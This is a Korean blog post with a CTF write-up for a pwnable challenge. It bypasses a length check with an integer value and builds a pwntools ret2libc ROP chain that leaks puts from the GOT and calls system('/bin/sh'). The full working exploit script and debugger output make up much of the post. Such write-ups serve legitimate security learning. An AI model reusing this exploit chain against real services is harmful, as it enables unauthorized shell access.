---
layout: post
title: Pwnable | [CTF] Simple Overflow
subtitle: Apollo Pwnable CTF
categories: Pwnable
tags: [Pwnable, CTF, ROP, Pentest]
---

**본 문제는 강원도 사이버 콘테스트 CTF에서 출제한 문제입니다.**

## 문제 내용

해당 문제는 **리턴 지향 프로그래밍**이라는 제목으로 Pwnable 카테고리로 나왔다. 따라서, 이 문제는 풀이 방식이 정해져 있음을 알고 해당 파일을 모두 받아왔습니다. 소스 코드 없이 실행 파일만 존재해 실행을 반복하면서 로직을 파악했습니다.

하지만, libc의 버전 관련해서는 나오지 않고 미숙했던 탓에 해당 기간내에는 풀지 못하고 다시 한번 도전해 풀게 되었습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/194214925-f49c5115-6120-4948-b000-3ad76e2b8da1.jpg" width = 350>
</p>

## 문제 풀이

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/194216316-5ed6bffc-6fc1-4f69-b7b9-3891dbbefa5c.jpg" width = 350>
</p>

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/194216384-0c3e5fe6-fcdf-478e-b873-877bf6c9b4d7.jpg" width = 350>
</p>

IDA Free 버전을 이용하여 해당 파일을 디컴파일링한 내용입니다.

* **len** : 16 이상일 경우 **puts(too long~)**과 함께 프로그램이 종료

* **name** : `read()` 함수를 통해 읽어들인 내용을 한 글자씩 값에 삽입

**len**가 16 이하일 경우 exploit할 내용을 모두 넘길 수 없기에 해당 내용을 넘길 방안이 필요하다. 두 가지의 내용이 있다.

* **len**가 음수 일 경우 : 해당 len는 unsigned로 선언되어 양수만을 받게 되지만, 값을 음수로 넣을 경우 메모리에는 **0xffffffff** 값이 들어가 if 로직을 피하면서 16 이상의 값을 넣을 수 있다.

* **len**가 int의 범위를 넘기는 경우 : int의 범위는 **–2,147,483,648 ~ 2,147,483,647**와 같다. 하지만, 양수 **2147483648** 값을 넣게 된다면 프로그램은 해당 값을 제대로 인지하지 못하고 if 로직을 피할 수 있다. 필자는 해당 방법을 사용해 문제를 풀이했습니다.

Exploit할 경우 어느 부분의 스택을 넘겨야 할 지 알아야 하기에 값을 넣어보면서 확인해봤습니다.

```armasm
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004011ee <+0>:     endbr64
   0x00000000004011f2 <+4>:     push   rbp
   0x00000000004011f3 <+5>:     mov    rbp,rsp
   0x00000000004011f6 <+8>:     sub    rsp,0x20
   0x00000000004011fa <+12>:    mov    rax,QWORD PTR [rip+0x2e5f]        # 0x404060 <stdin@@GLIBC_2.2.5>
   0x0000000000401201 <+19>:    mov    ecx,0x0
   0x0000000000401206 <+24>:    mov    edx,0x2
   0x000000000040120b <+29>:    mov    esi,0x0
   0x0000000000401210 <+34>:    mov    rdi,rax
   0x0000000000401213 <+37>:    call   0x401090 <setvbuf@plt>
   0x0000000000401218 <+42>:    mov    rax,QWORD PTR [rip+0x2e31]        # 0x404050 <stdout@@GLIBC_2.2.5>
   0x000000000040121f <+49>:    mov    ecx,0x0
   0x0000000000401224 <+54>:    mov    edx,0x2
   0x0000000000401229 <+59>:    mov    esi,0x0
   0x000000000040122e <+64>:    mov    rdi,rax
   0x0000000000401231 <+67>:    call   0x401090 <setvbuf@plt>
   0x0000000000401236 <+72>:    mov    QWORD PTR [rbp-0x10],0x0
   0x000000000040123e <+80>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000401246 <+88>:    mov    DWORD PTR [rbp-0x14],0x0
   0x000000000040124d <+95>:    lea    rdi,[rip+0xdb4]        # 0x402008
   0x0000000000401254 <+102>:   call   0x401070 <puts@plt>
   0x0000000000401259 <+107>:   lea    rdi,[rip+0xdda]        # 0x40203a
   0x0000000000401260 <+114>:   call   0x401070 <puts@plt>
   0x0000000000401265 <+119>:   lea    rax,[rbp-0x14]
   0x0000000000401269 <+123>:   mov    rsi,rax
   0x000000000040126c <+126>:   lea    rdi,[rip+0xdcd]        # 0x402040
   0x0000000000401273 <+133>:   mov    eax,0x0
   0x0000000000401278 <+138>:   call   0x4010a0 <__isoc99_scanf@plt>
   0x000000000040127d <+143>:   mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000401280 <+146>:   cmp    eax,0x10
   0x0000000000401283 <+149>:   jle    0x401298 <main+170>
   0x0000000000401285 <+151>:   lea    rdi,[rip+0xdb7]        # 0x402043
   0x000000000040128c <+158>:   call   0x401070 <puts@plt>
   0x0000000000401291 <+163>:   mov    eax,0xffffffff
   0x0000000000401296 <+168>:   jmp    0x4012ca <main+220>
   0x0000000000401298 <+170>:   lea    rdi,[rip+0xdae]        # 0x40204d
   0x000000000040129f <+177>:   call   0x401070 <puts@plt>
   0x00000000004012a4 <+182>:   mov    eax,DWORD PTR [rbp-0x14]
   0x00000000004012a7 <+185>:   movsxd rdx,eax
   0x00000000004012aa <+188>:   lea    rax,[rbp-0x10]
   0x00000000004012ae <+192>:   mov    rsi,rdx
   0x00000000004012b1 <+195>:   mov    rdi,rax
   0x00000000004012b4 <+198>:   call   0x401196 <readname>
```

* **main+119 ~ main+138** : 우리가 입력받는 len의 위치가 `[rbp-0x14]`에 위치

* **main+188 ~ main+198** : `readname()`를 통해 입력받을 name의 위치가 `[rbp-0x10]`에 위치

* **main Stack**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/194218303-a75de80a-067b-4c02-9109-27f79e2e563d.jpg" width = 500>
</p>

* **readname Stack**

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/194219371-415668a9-fcf2-48e2-8f6a-d25edaf7e582.jpg" width = 500>
</p>

readname의 `read()`에서 **A**를 넣고 값을 확인해보면 이 처럼 Main Stack에 입력 값이 들어가는 것을 알 수 있다. 

Main Stack에서의 Name은 rbp-0x14, 총 **0x14(20byte)**가 차지하는 것을 알 수 있으므로, 우리는 len에 int 범위를 초과하는 값과 Name을 20byte 이상의 값으로 BOF 진행이 가능하다.

여기서 사용하고 있는 함수 `scanf, puts, read`로 함수의 GOT을 읽어오고, `read`를 통한 ROP가 가능하다. `read` 함수가 한 번 존재하므로 GOP를 읽어오고 Main으로 다시 넘어가 Exploit으로 read를 한 번 더 진행하겠습니다.

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = process('./simple_overflow')
e = ELF('./simple_overflow')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = ROP(e)

puts_plt = e.plt['puts'] # puts 호출용
puts_got = e.got['puts'] # puts의 got 값
main = e.symbols['main'] # main 호출용

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
# pop_rdi = 0x401333
binsh_offset = list(libc.search(b'/bin/sh\x00'))[0] 
# /bin/sh\x00 값 검색
ret = r.find_gadget(['ret'])[0]
# ret = 0x40101a
slog('puts_plt', puts_plt)
slog('puts_got', puts_got)
slog('main', main)
slog('binsh_offset', binsh_offset)
```

`puts_got`를 인자를 넣어 `puts_plt`를 통해 puts를 호출하며 libc_base 주소를 알아내기 위해 사용한다.

```python
p.sendline('2147483648') # int 범위 초과

payload = b'A' * 0x18 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil('A' * 0x18)
p.recvline()

puts = u64(p.recvn(6) + b'\x00' * 2)
slog('puts', puts)
lb = puts - libc.symbols['puts']
system = lb + libc.symbols['system']
bin_sh = lb + binsh_offset
```

`puts`의 인자는 하나기에 **pop_rdi**를 사용했고, `puts_got`를 출력하기로 했으므로 해당 값을 `symbols`를 통한 offset과 값을 빼면 libc_base가 나온다.

해당 값의 system의 offset을 더한다면 `system`의 주소가 나오게 된다.

```python
p.sendline('2147483648')
payload = b'A' * 0x18
payload += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendline(payload)
p.interactive()
```

main의 값을 send하여 다시 main을 진행하게 됐습니다. `system`의 인자 또한 하나기에 **pop_rdi** 가젯을 사용했고, 이제 구해놓은 `/bin/sh\x00` 주소와, `system` 주소를 가젯을 활용하여 진행하면 됩니다.